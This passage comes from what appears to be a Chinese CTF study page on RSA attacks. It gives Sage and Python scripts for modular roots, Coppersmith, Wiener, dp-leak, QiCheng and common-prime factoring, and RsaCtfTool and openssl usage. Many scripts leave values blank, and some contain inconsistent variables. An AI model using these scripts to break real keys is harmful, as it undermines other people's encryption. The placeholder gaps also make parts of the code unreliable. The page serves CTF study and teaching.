{:#x}th root of {} modulo {}'.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print('[+] Find p:{}'.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print('[+] Find s:{}, t:{}'.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print('[+] Find alp:{}'.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print('[+] Calculating DLP...') j = - discrete_log(a, d) print('[+] Finish DLP...') b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(\"Finished in {} seconds.\".format(end - start)) print('Find one solution: {}'.format(result)) return result def findAllPRoot(p, e): print(\"Start to find all the Primitive {:#x}th root of 1 modulo {}.\".format(e, p)) start = time.time() proot = set() while len(proot) < e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) return proot def findAllSolutions(mp, proot, cp, p): print(\"Start to find all the {:#x}th root of {} modulo {}.\".format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) return all_mp c = 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359 p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059 q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741 e = 0x1337 cp = c % p cq = c % q mp = AMM(cp, e, p) mq = AMM(cq, e, q) p_proot = findAllPRoot(p, e) q_proot = findAllPRoot(q, e) mps = findAllSolutions(mp, p_proot, cp, p) mqs = findAllSolutions(mq, q_proot, cq, q) print(mps, mqs) def check(m): h = m.hex() if len(h) & 1: return False if bytes.fromhex(h).startswith(b'NCTF'): print(bytes.fromhex(h)) return True else: return False # About 16 mins to run 0x1337^2 == 24196561 times CRT start = time.time() print('Start CRT...') for mpp in mps: for mqq in mqs: solution = CRT_list([int(mpp), int(mqq)], [p, q]) if check(solution): print(solution) print(time.time() - start) end = time.time() print(\"Finished in {} seconds.\".format(end - start)) #\u811a\u672c2 #Sage c = 346925245648012783854132941104554194717281878370806475831055718275298366664505658836564073456294047402009856656647760 p = 21122913513992623721920275602985463699928507831138027 q = 16471885912035642894544190467774867069446937372970845578732298073 e = 239 P.<a>=PolynomialRing(Zmod(p),implementation='NTL') f=a^e-c mps=f.monic().roots() P.<a>=PolynomialRing(Zmod(q),implementation='NTL') g=a^e-c mqs=g.monic().roots() for mpp in mps: x=mpp[0] for mqq in mqs: y=mqq[0] solution = hex(CRT_list([int(x), int(y)], [p, q]))[2:] if solution.startswith('666c'): print(solution) \u200b * ##### SMUPE \u95ee\u9898 \uff08\u4e0d\u540cN,e\u52a0\u5bc6\u7ebf\u6027\u5173\u7cfb\u660e\u6587\uff09 a system of univariate polynomial equations problem = \u4e00\u5143\u591a\u9879\u5f0f\u65b9\u7a0b\u7ec4\u6c42\u89e3\u95ee\u9898 \u5b9a\u4e49 $$k$$ \u662f\u4e00\u4e2a\u6574\u6570\uff0c$$N$$ \u4e3a\u6ee1\u8db3RSA\u7b97\u6cd5\u7684\u6a21\u6570\uff0c$$\\delta$$ \u662f\u591a\u9879\u5f0f\u7684\u9636\u3002\u6709 $$N_i<N_{i+1},\\delta_i \\in N\\quad(i=1,2,\\cdots,k)$$ \u591a\u9879\u5f0f\u65b9\u7a0b\u7ec4\u8868\u793a\u5982\u4e0b, \u76ee\u7684\u662f\u6c42\u89e3 $$x$$\uff1a $$\\begin{cases} f_1(x)\\equiv 0 \\pmod {N_1}\\newline f_2(x)\\equiv 0 \\pmod {N_2} \\newline {\\vdots} \\newline f_k(x)\\equiv 0 \\pmod {N_k} \\end{cases}$$ + \u6c42\u89e3\u6761\u4ef6 Alexander May, Maike Ritzenhofent\u63d0\u51fa\u4e00\u79cd\u6c42\u89e3\u65b9\u6cd5\uff0c\u7b80\u5355\u5730\u8bf4\u5f53\u591a\u9879\u5f0f\u7684\u9636 $$\\delta$$ \u6ee1\u8db3\u4ee5\u4e0b\u60c5\u51b5\u65f6\u53ef\u89e3\uff08$$\\delta$$ \u662f\u591a\u9879\u5f0f\u7684\u9636\uff09\uff1a $$\\sum\\limits_{i=1}^k \\cfrac{1}{\\delta_i} \\geq 1$$ \u5177\u4f53\u63cf\u8ff0\uff1a \u4ee4 $$(f_i,\\delta_i,N_i) \\quad(i=1,2,\\cdots,k)$$ \u4f5c\u4e3aSMUPE\u95ee\u9898\u7684\u9996\u4e00\u591a\u9879\u5f0f\u7ec4\uff0c \u5b9a\u4e49 $$M=\\prod\\limits_{i=1}^k N_i^{\\frac{\\delta}{\\delta_i}},\\delta=\\text{lcm}(\\delta_i) \\quad (i=1,2,\\cdots,k)$$ \u5219SMUPE\u95ee\u9898\u53ef\u4ee5\u5728 $$O(\\delta^6\\cdot \\log_2M)$$ \u590d\u6742\u5ea6\u89e3\u51b3\u3002\u53c2\u8003\uff1a 2019\u7ea2\u5e3d\u676f - \u7cbe\u660e\u7684Alice \u200b * ##### \u53cd\u7d20\u6570\uff08emirp\u6570\uff09 \u5df2\u77e5\uff1a$$q=\\text{reverse_x}(p)$$\uff0c$$\\text{x}$$ \u4e3a\u8fdb\u5236\u6570\u3002 \u7206\u7834\u601d\u8def\u7c7b\u4f3cRSA parity oracle\u3002$$p,q$$ \u662fbit\u7ffb\u8f6c\u5173\u7cfb\uff0c\u5df2\u77e5 $$p$$ \u6700\u4f4e\u7684 $$k$$ \u4f4d\uff0c\u5219\u5df2\u77e5 $$q$$ \u6700\u9ad8\u7684 $$k$$ \u4f4d\u3002 \u5047\u8bbe\u5df2\u77e5 $$k$$ \u4f4d\u7684 $$p,q$$\uff0c\u8bb0\u4e3a $$ph,qh$$\uff0c\u5229\u7528\u4e0d\u7b49\u5f0f $$ph\\cdot qh\\cdot 2^{1024-2k}<=n<(ph+1)\\cdot(qh+1)\\cdot 2^{1024-2k}$$ \uff0c \u9010\u4f4d\u5411\u4f4e\u5730\u5740\u7206\u7834\uff0c\u4e0d\u65ad\u6536\u7f29\u4e0d\u7b49\u5f0f\u7684\u8303\u56f4\uff0c\u6700\u7ec8\u53ef\u6c42\u5f97 $$n$$ \u503c\u3002 \u53c2\u8003\uff1a ASIS 2015 Finals: RSASR Midnight Sun CTF 2020 Quals RoarCTF 2020 - Reverse #python2 #x=10 n = 6528060431134312098979986223024580864611046696815854430382374273411300418237131352745191078493977589108885811759425485490763751348287769344905469074809576433677010568815441304709680418296164156409562517530459274464091661561004894449297362571476259873657346997681362092440259333170797190642839587892066761627543 def t(a, b, k): # sqrt(n) has 155 digits, so we need to figure out 77 digits on each side if k == 77: if a*b == n: print a, b return for i in xrange(10): for j in xrange(10): # we try to guess the last not-already-guessed digits of both primes a1 = a + i*(10**k) + j*(10**(154-k)) b1 = b + j*(10**k) + i*(10**(154-k)) if a1*b1 > n: # a1 and b1 are too large continue if (a1+(10**(154-k)))*(b1+(10**(154-k))) < n: # a1 and b1 are too small continue if ((a1*b1)%(10**(k+1))) != (n%(10**(k+1))): # The last digits of a1*b1 (which won't change later) doesn't match n continue # this a1 and b1 seem to be a possible match, try to guess remaining digits t(a1, b1, k+1) # the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code) for i in xrange(10): t(i*(10**77), i*(10**77), 0) \u200b * ##### 4p-1 method \u5bf9\u4f7f\u7528\u4e00\u7c7b\u7279\u5b9a\u7d20\u6570\u4e58\u79ef\u7684\u6a21\u6570\u7684\u5206\u89e3\u3002 \u5f53\u4e00\u7c7b\u7279\u6b8a\u7684\u7d20\u6570\u7528\u5728 RSA \u6a21\u6570\u4e2d\u65f6\uff0c\u53ef\u4ee5\u8f7b\u6613\u7684\u5c06\u8be5\u7d20\u6570\u4ece $$n$$ \u4e2d\u5206\u89e3\u51fa\u6765\u3002\u7531\u4e8e\u8fd9\u4e00\u7c7b\u7d20\u6570\u90fd\u5f62\u5982 $$4p\u22121=Ds^2$$\uff0c\u56e0\u6b64\u53c8\u88ab\u79f0\u4e3a 4p-1 method \u3002\u6b64\u5916\uff0c\u6709\u4e9b\u4eba\u4e5f\u4f1a\u5c06\u5176\u89c6\u4e3a RSA \u7684\u540e\u95e8\u4e4b\u4e00\uff0c\u79f0\u4e4b\u4e3a RSA backdoor \u3002 QiCheng Prime $$Ds={3,11,19,43,67,163}$$ import sys sys.setrecursionlimit(10^6) def QiCheng(n): R = Integers(n) attempts = 20 js = [0, (-2^5)^3, (-2^5*3)^3, (-2^5*3*5)^3, (-2^5*3*5*11)^3, (-2^6*3*5*23*29)^3] for _ in range(attempts): for j in js: if j == 0: a = R.random_element() E = EllipticCurve([0, a]) else: a = R(j)/(R(1728)-R(j)) c = R.random_element() E = EllipticCurve([3*a*c^2, 2*a*c^3]) x = R.random_element() z = E.division_polynomial(n, x) g = gcd(z, n) if g > 1: return g n = p = int(QiCheng(Integer(n))) + Masaaki Shirase & Vladimir Sedlacek Improvement \u66f4\u591a $$Ds$$ \u503c\u3002 CM-based factorization \u53c2\u8003\uff1a \u6d45\u8c08 QiCheng Prime NCTF 2020 - RSA_revenge CryptoHack Challenge - RSA Backdoor Viability \u200b * ##### Common Prime RSA \u60c5\u5f62\uff1a$$\\gcd(p-1,q-1)=g$$ \u5206\u89e3\u7684n\u65b9\u6cd5\u6709\u56db\u79cd\uff1a \uff081\uff09\u4fee\u6539Pollard\u2019s rho\u65b9\u6cd5\u5206\u89e3n\uff1b \uff082\uff09\u77e5\u9053a\u3001b\u7684\u503c\u5206\u89e3n\uff1b \uff083\uff09\u77e5\u9053g\u7684\u503c\u5206\u89e3n\uff1b \uff084\uff09\u5206\u89e3N-1\u3002 # Pollard\u2019s rho def f(x, n): return (pow(x, n - 1, n) + 3) % n def rho(n): i = 1 print 'Factorizing' while True: x1 = getRandomRange(2, n) x2 = f(x1, n) j = 1 while True: p = gmpy2.gcd(abs(x1 - x2), n) if p == n: break elif p > 1 and isPrime(p): print 'Found!' return (p, n // p) else: x1 = f(x1, n) x2 = f(f(x2, n), n) j += 1 i += 1 \u8be6\u7ec6\u539f\u7406 \u4e8c\u5341\u5e74\u4ee5\u6765\u5bf9 RSA \u5bc6\u7801\u7cfb\u7edf\u653b\u51fb\u7efc\u8ff0 CTF Wiki - RSA 0xDktb\u2019s Blog RSA\u5e38\u89c1\u653b\u51fb\u65b9\u6cd5 Cryptanalysis of RSA and It\u2019s Variants \u539f\u6587\u94fe\u63a5\uff1a https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html","title":"RSA"},{"location":"other/RSA/#_1","text":"","title":"\u5e38\u7528\u5de5\u5177"},{"location":"other/RSA/#_2","text":"factordb \uff08 http://www.factordb.com \uff09 yafu \uff08p,q\u76f8\u5dee\u8fc7\u5927\u6216\u8fc7\u5c0fyafu\u53ef\u5206\u89e3\u6210\u529f\uff09 sage \uff08 divisors(n) \uff09\uff08\u5c0f\u7d20\u6570\uff09 Pollard\u2019s p\u22121 \uff08 python -m primefac -vs -m=p-1 xxxxxxx \uff09\uff08\u5149\u6ed1\u6570\uff09 Williams\u2019s p+1 \uff08 python -m primefac -vs -m=p+1 xxxxxxx \uff09\uff08\u5149\u6ed1\u6570\uff09","title":"\u5206\u89e3\u5927\u7d20\u6570"},{"location":"other/RSA/#sagehttpssagecellsagemathorg","text":"","title":"\u5728\u7ebfsage\u73af\u5883\uff1ahttps://sagecell.sagemath.org/"},{"location":"other/RSA/#openssl","text":"\u89e3\u6790\u52a0\u5bc6\u5bc6\u94a5\uff1a openssl rsa -pubin -text -modulus -in pub.key \u751f\u6210\u89e3\u5bc6\u5bc6\u94a5\uff1a python rsatool.py -f PEM -o key.key -p 1 -q 1 -e 1 openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag openssl rsautl -decrypt -oaep -inkey key.pem -in flag.enc -out flag \uff08OAEP\u65b9\u5f0f\uff09 \u811a\u672c\u751f\u6210\u89e3\u5bc6\u5bc6\u94a5\uff1a # coding=utf-8 import math import sys from Crypto.PublicKey import RSA keypair = RSA.generate(1024) keypair.p = keypair.q = keypair.e = keypair.n = keypair.p * keypair.q Qn = long((keypair.p - 1) * (keypair.q - 1)) i = 1 while (True): x = (Qn * i) + 1 if (x % keypair.e == 0): keypair.d = x / keypair.e break i += 1 private = open('private.pem', 'w') private.write(keypair.exportKey()) private.close()","title":"Openssl"},{"location":"other/RSA/#_3","text":"+ <https://github.com/Ganapati/RsaCtfTool> #\u7528\u6cd5\u4e00\uff1a\u5df2\u77e5\u516c\u94a5(\u81ea\u52a8\u6c42\u79c1\u94a5) $ python3 RsaCtfTool.py --publickey \u516c\u94a5\u6587\u4ef6 --uncipherfile \u52a0\u5bc6\u6587\u4ef6 #\u7528\u6cd5\u4e8c\uff1a\u5df2\u77e5\u516c\u94a5\u6c42\u79c1\u94a5 $ python3 RsaCtfTool.py --publickey \u516c\u94a5\u6587\u4ef6 --private #\u7528\u6cd5\u4e09\uff1a\u5bc6\u94a5\u683c\u5f0f\u8f6c\u6362 #\u628aPEM\u683c\u5f0f\u7684\u516c\u94a5\u8f6c\u6362\u4e3an\uff0ce $ python3 RsaCtfTool.py --dumpkey --key \u516c\u94a5\u6587\u4ef6 #\u628an,e\u8f6c\u6362\u4e3aPEM\u683c\u5f0f $ python3 RsaCtfTool.py --createpub -n 782837482376192871287312987398172312837182 -e 65537 + https://github.com/yifeng-lee/RSA-In-CTF + https://github.com/ValarDragon/CTF-Crypto \u200b","title":"\u811a\u672c\u96c6"},{"location":"other/RSA/#_4","text":"","title":"\u5e38\u89c1\u7c7b\u578b"},{"location":"other/RSA/#pqec","text":"import gmpy2 as gp import binascii p = q = e = c = n = p*q phi = (p-1)*(q-1) d = gp.invert(e,phi) m = pow(c,d,n) print(m) print(bytes.fromhex(hex(m)[2:])) \u200b","title":"\u7ed9p,q,e,c"},{"location":"other/RSA/#nedpc","text":"$$dp\\equiv d \\pmod {(p-1)}$$ $$\\because dp\\cdot e\\equiv d\\cdot e\\equiv 1 \\pmod {(p-1)}$$ $$\\therefore dp\\cdot e-1=k\\cdot (p-1)$$ $$\\therefore (dp\\cdot e-1)\\cdot d\\cdot e=k\u2019\\cdot (p-1),\\quad k\u2019=k\\cdot d\\cdot e \\ \\Leftrightarrow d\\cdot e=-k\u2019\\cdot (p-1)+dp\\cdot e\\cdot d\\cdot e\\equiv 1 \\pmod{\\varphi(n)} \\ \\Leftrightarrow -k\u2019\\cdot (p-1)+dp\\cdot e\\equiv 1\\pmod{\\varphi(n)}$$ $$\\therefore k_{1}\\cdot (p-1)+dp\\cdot e-1=k_{2}\\cdot (p-1)\\cdot (q-1) \\ \\Leftrightarrow (p-1)\\cdot (k_{2}\\cdot (q-1)-k_{1})+1=dp\\cdot e$$ $$\\because dp<p-1\\quad \\therefore (k_{2}\\cdot (q-1)-k_{1})\\in (0, e)$$ $$\\therefore$$ \u904d\u5386 $$(1, e)$$\uff0c\u5f53\u540c\u65f6\u6ee1\u8db3 $$(dp\\cdot e-1)\\bmod i==0$$ \u548c $$n\\bmod((dp\\cdot e-1)//i+1)==0$$ \u65f6\uff0c$$N$$ \u6210\u529f\u5206\u89e3\u3002 import gmpy2 as gp e = n = dp = c = for x in range(1, e): if(e*dp%x==1): p=(e*dp-1)//x+1 if(n%p!=0): continue q=n//p phin=(p-1)*(q-1) d=gp.invert(e, phin) m=gp.powmod(c, d, n) if(len(hex(m)[2:])%2==1): continue print('--------------') print(m) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) \u53d8\u79cd1\uff1a \u7ed9 $$p,e,d_p,c,b$$\uff0c\u5176\u4e2d $$n=p^bq$$\u3002 Hensel lifting for Takagi\u2019s scheme \uff08p.189\uff09\uff1a from Crypto.Util.number import * import gmpy2 p = dp = c = b = e = mp1 = pow(c, dp, p) mp = pow(c, dp - 1, p) for i in range(1, b - 2): x = pow(c - pow(mp1, e), 1, p**(i + 1)) y = pow(x * mp * (gmpy2.invert(e, p)), 1, p**(i + 1)) mp1 = mp1 + y print(long_to_bytes(mp1)) \u53d8\u79cd2 \uff1a\u7ed9 $$n,e,dp_0,c,k$$\uff0c\u5176\u4e2d $$dp_0$$ \u4e3a $$dp$$ \u9ad8 $$(n\\text{bits}-k)$$ \u4f4d\uff0c\u5373 $$dp_0=dp>>k$$\u3002 \uff08Coppersmith\u653b\u51fb\uff0c\u5df2\u77e5dp\u9ad8\u4f4d\u653b\u51fb\uff09 $$e\\cdot dp \\equiv e\\cdot d\\equiv 1 \\pmod {(p-1)} \\ \\Leftrightarrow e \\cdot dp=k(p-1)+1=kp-k+1 \\ \\Leftrightarrow e\\cdot dp+k-1 \\equiv 0 \\pmod p$$ $$\\because dp<p-1$$\uff0c$$\\therefore k<e$$ $$\\therefore e\\cdot (dp_0<<k+x)+k-1 \\equiv 0 \\pmod p$$ #Sage dp0 = e = n = F.<x> = PolynomialRing(Zmod(n)) d = inverse_mod(e, n) for k in range(1, e): f = (secret << 200) + x + (k - 1) * d x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32) if len(x0) != 0: dp = x0[0] + (secret << 200) for i in range(2, e): p = (e * Integer(dp) - 1 + i) // i if n % p == 0: break if p < 0: continue else: print('k = ',k) print('p = ',p) print('dp = ',dp) break * \u53d8\u79cd3 \uff1a\u7ed9 $$n,e,dp,c$$\u200b\u200b\uff0c\u5176\u4e2d $$dp$$\u200b\u200b\u200b \u5f88\u5c0f\uff0c$$e$$ \u5f88\u5927\u3002 \u679a\u4e3e $$dp$$\uff0c\u56e0 $$e\\cdot dp \\equiv 1 \\pmod {(p-1)}$$\uff0c\u53c8\u7531\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u5bf9\u4efb\u610f $$r$$\uff0c\u6709 $$m^{e \\cdot dp}\\equiv m \\pmod p$$\uff0c\u5373 $$p \\mid (m^{e \\cdot dp}-m)$$\uff1b \u53c8 $$p \\mid n$$\uff0c\u5f88\u5927\u6982\u7387 $$p=\\gcd(m^{e \\cdot dp}-m,n)$$\u3002 \u200b","title":"\u7ed9n,e,dp,c"},{"location":"other/RSA/#pqdpdqc","text":"$$dp=d \\bmod (p-1)$$\uff0c$$dq=d \\bmod (q-1)$$ $$\\because d=k_{1}(p-1)+dp=k_{2}(q-1)+dq \\ \\Leftrightarrow k_{1}(p-1)=(dq-dp)+k_{2}(q-1) \\ \\Leftrightarrow k_{1}\\frac{p-1}{\\gcd(p-1,q-1)}=\\frac{dq-dp}{\\gcd(p-1,q-1)}+k_{2}\\frac{q-1}{\\gcd(p-1,q-1)} \\ \\Rightarrow k_{1}\\frac{p-1}{\\gcd(p-1,q-1)}\\equiv\\frac{dq-dp}{\\gcd(p-1,q-1)} \\pmod {\\frac{q-1}{\\gcd(p-1,q-1)}} \\ \\Leftrightarrow k_{1}\\equiv \\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{dq-dp}{\\gcd(p-1,q-1)} \\pmod {\\frac{q-1}{\\gcd(p-1,q-1)}}$$ \u5c06 $$k_{1}=k_{3}\\frac{q-1}{\\gcd(p-1,q-1)}+\\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{dq-dp}{\\gcd(p-1,q-1)}$$ \u4ee3\u5165 $$d=k_{1}(p-1)+dp$$ $$d=k_{3}\\frac{(p-1)(q-1)}{\\gcd(p-1,q-1)}+\\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{(dq-dp)(p-1)}{\\gcd(p-1,q-1)}+dp \\ \\Rightarrow d\\equiv \\text{inv}(\\frac{p-1}{\\gcd(p-1,q-1)},\\frac{q-1}{\\gcd(p-1,q-1)})\\cdot \\frac{(dq-dp)(p-1)}{\\gcd(p-1,q-1)}+dp \\pmod{\\frac{(p-1)(q-1)}{\\gcd(p-1,q-1)}}$$ import gmpy2 as gp p = q = dp = dq = c = n = p*q phin = (p-1)*(q-1) dd = gp.gcd(p-1, q-1) d=(dp-dq)//dd * gp.invert((q-1)//dd, (p-1)//dd) * (q-1) +dq print(d) m = gp.powmod(c, d, n) print('-------------------') print(m) print(hex(m)[2:]) print(bytes.fromhex(hex(m)[2:])) \u200b","title":"\u7ed9p,q,dp,dq,c"},{"location":"other/RSA/#edwiener-attack","text":"\u9002\u7528\u60c5\u51b5\uff1a\u5df2\u77e5 $$N,e$$\uff0c\u4e14 $$e$$ \u8fc7\u5927\u6216\u8fc7\u5c0f\u3002 $$\\varphi(n) = (p-1)(q-1)=pq - (p + q) + 1=N - (p + q) + 1$$ $$\\because p, q$$ \u975e\u5e38\u5927\uff0c$$\\therefore\\,pq\\gg p+q$$\uff0c $$\\therefore\\varphi(n)\\approx N$$ $$\\because ed\\equiv1\\,mod\\,\\varphi(n)$$\uff0c$$\\therefore ed-1=k\\varphi(n)$$\uff0c\u8fd9\u4e2a\u5f0f\u5b50\u4e24\u8fb9\u540c\u9664 $$d\\varphi(n)$$ \u53ef\u5f97\uff1a $$\\cfrac{e}{\\varphi(n)}-\\cfrac{k}{d}=\\cfrac{1}{d\\varphi(n)}$$ $$\\because \\varphi(n)\\approx N$$\uff0c$$\\therefore \\cfrac{e}{N}-\\cfrac{k}{d}=\\cfrac{1}{d\\varphi(n)}$$\uff0c\u540c\u6837 $$d\\varphi(n)$$ \u662f\u4e00\u4e2a\u5f88\u5927\u7684\u6570\uff0c\u6240\u4ee5 $$\\cfrac{e}{N}$$ \u7565\u5927\u4e8e $$\\cfrac{k}{d}$$ \u56e0\u4e3a $$e$$ \u548c $$N$$ \u662f\u77e5\u9053\u7684\uff0c\u6240\u4ee5\u8ba1\u7b97\u51fa $$\\cfrac{e}{N}$$ \u540e\uff0c\u6bd4\u5b83\u7565\u5c0f\u7684 $$\\cfrac{k}{d}$$ \uff0c\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97 $$\\cfrac{e}{N}$$ \u7684\u8fde\u5206\u6570\u5c55\u5f00\uff0c\u4f9d\u6b21\u7b97\u51fa\u8fd9\u4e2a\u5206\u6570\u6bcf\u4e00\u4e2a\u6e10\u8fdb\u5206\u6570\uff0c\u7531\u4e8e $$\\cfrac{e}{N}$$ \u7565\u5927\u4e8e $$\\cfrac{k}{d}$$\uff0cWiener \u8bc1\u660e\u4e86\uff0c\u8be5\u653b\u51fb\u80fd\u7cbe\u786e\u7684\u8986\u76d6 $$\\cfrac{k}{d}$$\u3002 \u5728 $$e$$ \u8fc7\u5927\u6216\u8fc7\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4f7f\u7528\u7b97\u6cd5\u4ece $$e$$ \u4e2d\u5feb\u901f\u63a8\u65ad\u51fa $$d$$ \u7684\u503c\u3002\u53ef\u4ee5\u89e3\u51b3 $$q<p<2q,d<\\cfrac{1}{3}N^{\\frac{1}{4}}$$ \u7684\u95ee\u9898\u3002 RSAWienerHacker\u5de5\u5177\uff1a https://github.com/pablocelayes/rsa-wiener-attack #\u811a\u672c1\uff08\u5e26\u5de5\u5177\uff09 #python2 import RSAwienerHacker n = e = d = RSAwienerHacker.hack_RSA(e,n) if d: print(d) import hashlib flag = \"flag{\" + hashlib.md5(hex(d)).hexdigest() + \"}\" print flag #\u811a\u672c2 #sage def rational_to_contfrac(x,y): # Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotients def convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convs def contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom) n = e = c = def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x) def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % m def isqrt(n): x = n y = (x + 1) // 2 while y < x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D >= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return d d = crack_rsa(e, n) m = hex(pow(c, d, n))[2:] print(bytes.fromhex(m)) #\u811a\u672c3 from Crypto.Util.number import long_to_bytes e = n = c = #\u5c06\u5206\u6570x/y\u5c55\u5f00\u4e3a\u8fde\u5206\u6570\u7684\u5f62\u5f0f def transform(x,y): arr=[] while y: arr+=[x//y] x,y=y,x%y return arr #\u6c42\u89e3\u6e10\u8fdb\u5206\u6570 def sub_fraction(k): x=0 y=1 for i in k[::-1]: x,y=y,x+i*y return (y,x) data=transform(e,n) for x in range(1,len(data)+1): data1=data[:x] d = sub_fraction(data1)[1] m = pow(c,d,n) flag = long_to_bytes(m) if b'flag{' in flag: print(flag) break \u53d8\u79cd1 \uff1a$$\\cfrac{N_1}{N_2}<\\cfrac{q_1}{q_2}<1$$ \u53c2\u8003\uff1a 2020\u5e74\u7f8a\u57ce\u676f - RRRRRRRSA Paper: https://eprint.iacr.org/2015/399.pdf \u5c1d\u8bd5\u5bf9 $$\\cfrac{N_1}{N_2}$$ \u8fdb\u884c\u8fde\u5206\u6570\u5c55\u5f00\u5e76\u6c42\u5176\u5404\u9879\u6e10\u8fdb\u5206\u6570\uff0c\u8bb0\u4e3a $$\\cfrac{t_i}{s_i}$$ \u5e76\u9a8c\u8bc1 $$N_1\\% {t_k}==0$$ \u662f\u5426\u6210\u7acb\uff0c\u5982\u679c\u6210\u7acb\uff0c\u90a3\u4e48 $$q_1=t_k\uff0cq_2=s_k$$\u3002 \u8fde\u5206\u6570\u903c\u8fd1 \uff1a def transform(x,y): #\u4f7f\u7528\u8f97\u8f6c\u76f8\u9664\u5c06\u5206\u6570x/y\u8f6c\u4e3a\u8fde\u5206\u6570\u7684\u5f62\u5f0f res=[] while y: res.append(x//y) x,y=y,x%y return res def continued_fraction(sub_res): numerator,denominator=1,0 for i in sub_res[::-1]: #\u4ecesublist\u7684\u540e\u9762\u5f80\u524d\u5faa\u73af denominator,numerator=numerator,i*numerator+denominator return denominator,numerator #\u5f97\u5230\u6e10\u8fdb\u5206\u6570\u7684\u5206\u6bcd\u548c\u5206\u5b50\uff0c\u5e76\u8fd4\u56de #\u6c42\u89e3\u6bcf\u4e2a\u6e10\u8fdb\u5206\u6570 def sub_fraction(x,y): res=transform(x,y) res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res))))) #\u5c06\u8fde\u5206\u6570\u7684\u7ed3\u679c\u9010\u4e00\u622a\u53d6\u4ee5\u6c42\u6e10\u8fdb\u5206\u6570 return res def wienerAttack(n1,n2): for (q2,q1) in sub_fraction(n1,n2): #\u7528\u4e00\u4e2afor\u5faa\u73af\u6765\u6ce8\u610f\u8bd5\u63a2n1/n2\u7684\u8fde\u7eed\u51fd\u6570\u7684\u6e10\u8fdb\u5206\u6570\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u6e10\u8fdb\u5206\u6570 if q1==0: #\u53ef\u80fd\u4f1a\u51fa\u73b0\u8fde\u5206\u6570\u7684\u7b2c\u4e00\u4e2a\u4e3a0\u7684\u60c5\u51b5\uff0c\u6392\u9664 continue if n1%q1==0 and q1!=1: #\u6210\u7acb\u6761\u4ef6 return (q1,q2) print(\"\u8be5\u65b9\u6cd5\u4e0d\u9002\u7528\") N1=60143104944034567859993561862949071559877219267755259679749062284763163484947626697494729046430386559610613113754453726683312513915610558734802079868190554644983911078936369464590301246394586190666760362763580192139772729890492729488892169933099057105842090125200369295070365451134781912223048179092058016446222199742919885472867511334714233086339832790286482634562102936600597781342756061479024744312357407750731307860842457299116947352106025529309727703385914891200109853084742321655388368371397596144557614128458065859276522963419738435137978069417053712567764148183279165963454266011754149684758060746773409666706463583389316772088889398359242197165140562147489286818190852679930372669254697353483887004105934649944725189954685412228899457155711301864163839538810653626724347 N2=601431049440345678599935618629490715598772192677552596797490622847631634849476266974947290464303865596106131137544537266833125139156105587348020798681956336474317328753921214586843318433067308894244186200693225782652363514075910293385198095389952498969051376423424356595729177141835433052437156643807877975620110063987303209809947479397915618856229499126982467017693214303259029120030416787744407040565978620935309810406968725228689211390412473625922572854239488709441370197451612115858459270192597095012375508189182721896064364139927593283188717651718441535274243479854627670281353765523024638613244081781838421393302449066067763590504829772567289102786879961061529710288786531235335597601677112702651714416230568739036699186942590435800170816713492320518707164